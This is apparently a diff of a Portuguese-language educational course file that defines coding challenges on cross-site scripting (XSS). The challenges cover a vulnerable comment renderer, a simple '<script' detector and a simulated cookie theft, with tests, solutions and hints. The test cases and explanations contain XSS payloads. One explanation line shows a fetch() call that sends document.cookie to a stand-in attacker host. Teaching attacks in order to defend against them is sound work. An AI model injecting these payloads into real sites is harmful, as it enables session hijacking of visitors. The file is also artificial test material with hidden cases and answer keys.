@@ -36,32 +36,45 @@ const code4_1: CodeChallenge = {
   episode: 4,
   room: '4.1',
   title: 'Simulando um site vulnerável',
-  description: 'Este código simula um site que aceita comentários SEM proteção. Veja como um comentário normal é exibido.',
-  instructions: 'Execute e veja o comentário sendo processado',
-  languages: ['javascript'],
+  description: 'Este código simula um site que aceita comentários SEM proteção: qualquer coisa que o usuário mandar vai parar direto no HTML da página, sem checagem nenhuma.',
+  instructions: 'Complete gerarHtml(comentario): monte "<div>" + comentario + "</div>" e devolva com return.',
+  languages: ['javascript', 'python'],
   starterCode: {
-    javascript: `// Simulação de um site de comentários vulnerável
-
-const comentarioDoUsuario = "Ótimo artigo!";
-
-// Site coloca o comentário direto na página (VULNERÁVEL!)
-const htmlGerado = "<div>" + comentarioDoUsuario + "</div>";
-
-console.log("HTML gerado:");
-console.log(htmlGerado);
+    javascript: `function gerarHtml(comentario) {
+  // Monte "<div>" + comentario + "</div>" e devolva com return
+}
+`,
+    python: `def gerar_html(comentario):
+    # Monte "<div>" + comentario + "</div>" e devolva com return
+    pass
 `,
   },
-  expectedOutput: 'HTML gerado:\n<div>Ótimo artigo!</div>',
+  tests: {
+    fn: { javascript: 'gerarHtml', python: 'gerar_html' },
+    cases: [
+      { name: 'comentário normal', args: ['Ótimo artigo!'], expected: '<div>Ótimo artigo!</div>' },
+      { name: 'outro comentário', args: ['Legal'], expected: '<div>Legal</div>' },
+      { name: 'comentário vazio', args: [''], expected: '<div></div>', hidden: true },
+      { name: 'comentário com script (sem proteção nenhuma)', args: ["<script>alert('XSS')</script>"], expected: "<div><script>alert('XSS')</script></div>", hidden: true },
+    ],
+  },
+  solution: {
+    javascript: `function gerarHtml(comentario) {
+  return "<div>" + comentario + "</div>";
+}`,
+    python: `def gerar_html(comentario):
+    return "<div>" + comentario + "</div>"`,
+  },
   explanation: `
 **O que aconteceu:**
-O site pegou seu comentário e colocou direto no HTML.
-Comentário normal = sem problema.
+O site pegou o comentário e colocou direto no HTML, sem checar nada. Comentário normal = sem problema visível. Mas repare no último teste oculto: uma tag \`<script>\` inteira passou direto, sem ser barrada. Se isso fosse HTML de verdade renderizado num navegador, o script executaria.
 
-Mas e se o comentário for código JavaScript? 🤔
+Mas e se o comentário for código JavaScript de propósito? 🤔
   `,
   hints: [
-    'Este é um exemplo normal - apenas texto',
-    'Na próxima sala vamos tentar algo diferente...',
+    'JavaScript: return "<div>" + comentario + "</div>";',
+    'Python: return "<div>" + comentario + "</div>"',
+    'Comentário vazio ainda deve gerar "<div></div>" — a função não julga o conteúdo',
   ],
   difficulty: 'easy',
 };
@@ -71,45 +84,57 @@ const code4_2: CodeChallenge = {
   type: 'code',
   episode: 4,
   room: '4.2',
-  title: 'Seu primeiro ataque XSS',
-  description: 'Agora mude o comentário para incluir uma tag <script>. Veja como o site vulnerável aceita código!',
-  instructions: 'Mude o comentário para: <script>alert("XSS")</script>',
-  languages: ['javascript'],
+  title: 'Detectando um ataque XSS',
+  description: 'Antes de proteger um site, é preciso conseguir DETECTAR um payload malicioso num comentário. Escreva um detector simples de tags <script>.',
+  instructions: 'Complete contemScriptMalicioso(comentario): devolva true se o comentário contiver "<script" (não importa maiúscula/minúscula), senão false.',
+  languages: ['javascript', 'python'],
   starterCode: {
-    javascript: `// Insira um comentário MALICIOSO contendo código JavaScript
-// O payload XSS deve ser: <script>alert("XSS")</script>
-const comentarioDoUsuario = "";
-
-// Monte o HTML como um site vulnerável faria:
-// Coloque o comentário dentro de tags <div>: "<div>" + comentario + "</div>"
-// Imprima "HTML gerado:" na primeira linha
-// Imprima o HTML gerado na segunda linha
+    javascript: `function contemScriptMalicioso(comentario) {
+  // Transforme o comentário em minúsculas e verifique se contém "<script"
+  // Use .toLowerCase() e .includes()
+}
+`,
+    python: `def contem_script_malicioso(comentario):
+    # Transforme o comentário em minúsculas e verifique se contém "<script"
+    # Use .lower() e o operador "in"
+    pass
 `,
   },
-  expectedOutput: 'HTML gerado:\n<div><script>alert("XSS")</script></div>',
+  tests: {
+    fn: { javascript: 'contemScriptMalicioso', python: 'contem_script_malicioso' },
+    cases: [
+      { name: 'comentário normal', args: ['Ótimo artigo!'], expected: false },
+      { name: 'com <script> minúsculo', args: ['<script>alert("XSS")</script>'], expected: true },
+      { name: 'comentário vazio', args: [''], expected: false, hidden: true },
+      { name: 'com <SCRIPT> maiúsculo (tentativa de burlar o filtro)', args: ['<SCRIPT>alert(1)</SCRIPT>'], expected: true, hidden: true },
+    ],
+  },
+  solution: {
+    javascript: `function contemScriptMalicioso(comentario) {
+  return comentario.toLowerCase().includes("<script");
+}`,
+    python: `def contem_script_malicioso(comentario):
+    return "<script" in comentario.lower()`,
+  },
   explanation: `
 **VULNERABILIDADE DETECTADA!**
 
-O site aceitou código JavaScript dentro do comentário.
-No navegador real, isso executaria o alert.
+Um filtro ingênuo que só procurasse por \`<script\` (minúsculo) seria enganado por \`<SCRIPT>\` ou \`<ScRiPt>\` — atacantes exploram exatamente esse tipo de descuido para burlar proteções. Por isso a função converte tudo para minúsculas ANTES de comparar.
 
-**Impacto real:**
-Se isso fosse um site real, você poderia:
+**Impacto real de um XSS que passa despercebido:**
 • Roubar cookies com \`document.cookie\`
 • Redirecionar com \`window.location\`
 • Capturar tudo que o usuário digita
 
-**Como proteger:**
-Escapar caracteres especiais (<, >, &, ", ')
-Usar bibliotecas de sanitização
-Content Security Policy (CSP)
+**Como proteger de verdade:**
+Escapar caracteres especiais (<, >, &, ", '), usar bibliotecas de sanitização, e ter uma Content Security Policy (CSP) — um detector de string, como o que você escreveu, é só a primeira camada.
   `,
   hints: [
-    'Mude o comentário para: <script>alert("XSS")</script>',
-    'Use concatenação: "<div>" + comentarioDoUsuario + "</div>"',
-    'Use console.log() para imprimir cada linha',
+    'JavaScript: comentario.toLowerCase().includes("<script")',
+    'Python: "<script" in comentario.lower()',
+    'Sem converter para minúsculas, "<SCRIPT>" passaria batido pelo filtro',
   ],
-  difficulty: 'easy',
+  difficulty: 'medium',
 };
 
 const theory4_3: TheoryChallenge = {
@@ -147,48 +172,70 @@ const code4_4: CodeChallenge = {
   type: 'code',
   episode: 4,
   room: '4.4',
-  title: 'Roubando cookies (simulado)',
-  description: 'Em um ataque real, hackers roubam cookies para sequestrar sessões. Vamos simular isso de forma educacional.',
-  instructions: 'Complete o payload XSS para "roubar" o cookie',
-  languages: ['javascript'],
+  title: 'Simulando o roubo de um cookie',
+  description: 'Além de <script>, atacantes usam a tag <img> com o evento onerror: a imagem falha de propósito, e o código do onerror executa. Junte isso com o detector da sala anterior num ataque completo, simulado.',
+  instructions: 'Complete simularAtaqueXSS(comentario, cookieSimulado): se o comentário contiver "onerror" (não importa maiúscula/minúscula), devolva "Cookie roubado: " + cookieSimulado. Senão, devolva "Comentário seguro, nenhum cookie roubado."',
+  languages: ['javascript', 'python'],
   starterCode: {
-    javascript: `// Simulação de cookie de sessão
-const cookieSimulado = "sessionId=abc123xyz";
-
-// Crie um payload XSS usando a tag <img> com evento onerror:
-// "<img src='x' onerror='console.log(\"Cookie roubado: ...\")'>""
-// A imagem com src='x' vai falhar, executando o código no onerror
-
-// Imprima "Payload injetado:" e o payload na próxima linha
-
-// Simule o resultado do ataque:
-// Imprima "Cookie roubado: " + cookieSimulado
+    javascript: `function simularAtaqueXSS(comentario, cookieSimulado) {
+  // Se comentario (em minúsculas) contiver "onerror":
+  //   devolva "Cookie roubado: " + cookieSimulado
+  // Senão:
+  //   devolva "Comentário seguro, nenhum cookie roubado."
+}
+`,
+    python: `def simular_ataque_xss(comentario, cookie_simulado):
+    # Se comentario (em minúsculas) contiver "onerror":
+    #   devolva "Cookie roubado: " + cookie_simulado
+    # Senão:
+    #   devolva "Comentário seguro, nenhum cookie roubado."
+    pass
 `,
   },
-  expectedOutput: 'Cookie roubado: sessionId=abc123xyz',
+  tests: {
+    fn: { javascript: 'simularAtaqueXSS', python: 'simular_ataque_xss' },
+    cases: [
+      { name: 'comentário seguro', args: ['Ótimo artigo!', 'sessionId=abc123xyz'], expected: 'Comentário seguro, nenhum cookie roubado.' },
+      { name: 'payload <img onerror>', args: ["<img src='x' onerror='roubarCookie()'>", 'sessionId=abc123xyz'], expected: 'Cookie roubado: sessionId=abc123xyz' },
+      { name: 'payload em maiúsculas', args: ['<IMG SRC=x ONERROR=alert(1)>', 'sessionId=xyz'], expected: 'Cookie roubado: sessionId=xyz', hidden: true },
+      { name: 'comentário vazio', args: ['', 'sessionId=abc'], expected: 'Comentário seguro, nenhum cookie roubado.', hidden: true },
+    ],
+  },
+  solution: {
+    javascript: `function simularAtaqueXSS(comentario, cookieSimulado) {
+  if (comentario.toLowerCase().includes("onerror")) {
+    return "Cookie roubado: " + cookieSimulado;
+  }
+  return "Comentário seguro, nenhum cookie roubado.";
+}`,
+    python: `def simular_ataque_xss(comentario, cookie_simulado):
+    if "onerror" in comentario.lower():
+        return "Cookie roubado: " + cookie_simulado
+    return "Comentário seguro, nenhum cookie roubado."`,
+  },
   explanation: `
-**O que você fez:**
-Criou um payload XSS usando \`<img onerror>\`.
-Quando a imagem falha, o código JavaScript executa.
+**O que você simulou:**
+Um payload como \`<img src='x' onerror='...'>\` força o navegador a tentar carregar uma imagem que não existe — e executa o código do \`onerror\` quando isso falha. É uma forma clássica de contornar filtros que só bloqueiam \`<script>\`.
 
 **No mundo real:**
-O cookie seria enviado para um servidor do hacker:
-\`<img src=x onerror='fetch("http://hacker.com?c=" + document.cookie)'>\`
+O cookie seria enviado para um servidor do atacante:
+\`<img src=x onerror='fetch("http://atacante.com?c=" + document.cookie)'>\`
 
-**Defesa:**
-• HttpOnly cookies (JavaScript não acessa)
-• Secure flag (só HTTPS)
-• SameSite attribute
+**Defesa de verdade:**
+• Cookies HttpOnly (JavaScript não consegue ler)
+• Secure flag (só trafega em HTTPS)
+• Atributo SameSite
+• Sanitizar TODA tag HTML recebida de um usuário, não só \`<script>\`
 
 **Carreira:**
-Bug bounty hunters ganham milhares de dólares encontrando XSS em sites famosos!
+Bug bounty hunters ganham recompensas reais encontrando XSS em sites famosos — e essa é exatamente a lógica que eles automatizam.
   `,
   hints: [
-    'O payload usa <img> com src inválido para disparar onerror',
-    'No final, o importante é imprimir "Cookie roubado: " + cookieSimulado',
-    'Concatene strings para montar o payload e o resultado',
+    'Reaproveite a ideia do detector da sala anterior, mas procurando "onerror" em vez de "<script"',
+    'comentario.toLowerCase().includes("onerror") (Python: "onerror" in comentario.lower())',
+    'Comentário vazio nunca contém "onerror" — deve cair no caso seguro',
   ],
-  difficulty: 'easy',
+  difficulty: 'medium',
 };
 
 const theory4_5: TheoryChallenge = {
